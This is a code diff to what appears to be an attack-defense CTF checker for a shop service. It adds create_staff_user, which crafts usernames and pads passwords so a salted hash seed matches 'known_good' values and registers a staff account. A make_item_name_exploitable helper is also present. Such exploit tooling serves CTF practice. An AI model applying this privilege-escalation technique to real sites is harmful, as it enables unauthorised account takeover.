@@ -13,7 +13,8 @@ import hashlib
 from errors import *
 from files import license_from_template
 from exceptions import GenericException, PixelsException
-
+import django_random_user_hash.user as HashUser
+import string_utils
 
  
 
@@ -33,16 +34,19 @@ def check_kwargs(func_name: str ,keys: list, kwargs):
             return
 
 async def refresh_token(client: AsyncClient, url: str) -> str:
+    token =""
     try:
-        response = await client.get(url)
-
-        if 'csrftoken' in response.cookies:
-            return response.cookies['csrftoken']
-        return response.cookies['csrf']  
-
-    except CSRFRefreshError:
-        raise MumbleException(f"Error while requesting new token from {url}")
-
+        response = await client.get(url,follow_redirects=True)
+        try:            
+            token = response.cookies['csrftoken']    
+        except CSRFRefreshError:
+            raise MumbleException(f"Error while requesting new token from {url} - No cookie value!")
+    except RequestError:
+        raise MumbleException(f"Error while requesting new token from {url} - Response failed!")
+    return token
+        
+        
+    
 
 
 async def register_user(client: AsyncClient, logger: LoggerAdapter,db: ChainDB) -> Tuple[str,str]:
@@ -77,7 +81,7 @@ async def register_user(client: AsyncClient, logger: LoggerAdapter,db: ChainDB) 
     
     assert_equals(response.status_code, 200, "Registration failed")
     await db.set("user",{'username':username,'password':password})
-    return [username,password]
+    return data
 
 
 async def login(client: AsyncClient, logger: LoggerAdapter, db: ChainDB,kwargs) -> None:
@@ -254,3 +258,76 @@ async def make_item_name_exploitable(item_name:str) -> str:
             res = item_name[0:index] + chr(exploits[key]) + item_name[index+len(key):]
             break
     return res
+
+def adjust_pw(offset:int,pw:str) -> str:
+    min = 33
+    max = 126
+    while offset != 0:
+        if offset < max:
+            max= offset
+        rint = random.randint(min,max)
+        if offset - rint < min:
+            rint = offset
+        pw += chr(rint)
+        offset -= rint
+    return pw
+
+
+async def create_staff_user(client: AsyncClient, logger: LoggerAdapter,db: ChainDB,kwargs) -> None:
+    known_good = [
+        9260, 20640, 48143, 114881, 189663, 208534, 261981, 293375, 304144, 329994, 347885,
+        449225, 497661, 556423, 608984, 630902, 696892, 741704, 859564, 868048, 936481]
+    keys = ['data','key','salt']
+    check_kwargs(func_name=create_staff_user.__name__,keys=keys,kwargs=kwargs)
+    data = kwargs['data']
+    user = HashUser.User(
+        f= data['first_name'],
+        l= data['last_name'],
+        e=data['email'],
+        p1=data['password1'],
+        p2=data['password2'],
+        u=string_utils.shuffle(data['username']),
+    )
+
+    seed = user.gen_seed_value(salt=kwargs['salt'])
+    offset = -1
+    for k in known_good:
+        if k-seed > 0:
+
+            offset = k-seed
+            if offset >= 0:
+                break
+    if offset % 2 != 0:
+        alphabet = string.ascii_letters + string.digits
+        for i,c in enumerate(user.username):
+            if chr(ord(c)+1) in alphabet:
+                user.username = '%s%s%s' %(user.username[:i],chr(ord(c)+1),user.username[i+1:])
+
+    user.password1 = adjust_pw(offset//2,user.password1)  
+    user.password2 = user.password1
+    
+    data={
+        "username": user.username,
+        "password1": user.password1,
+        "password2": user.password2,
+        "first_name": user.first,
+        "last_name": user.last,
+        "email": user.email,
+        "cryptographic_key": user.gen_sha1(level=2,salt=kwargs['salt']),
+        "next/": "shop/",
+        "csrfmiddlewaretoken": await refresh_token(client,"signup/")
+    }
+
+    headers={
+        "Referer": f"{client.base_url}/signup/"
+    }
+
+    try:
+        response = await client.post("signup/",data=data,headers=headers,follow_redirects=True)
+    except RequestError:    
+        raise MumbleException(f"Error while registering user")
+    
+    assert_equals(response.status_code, 200, "Registration failed")
+    await db.set("user",{'username':user.username,'password':user.password1})
+    return data
+    
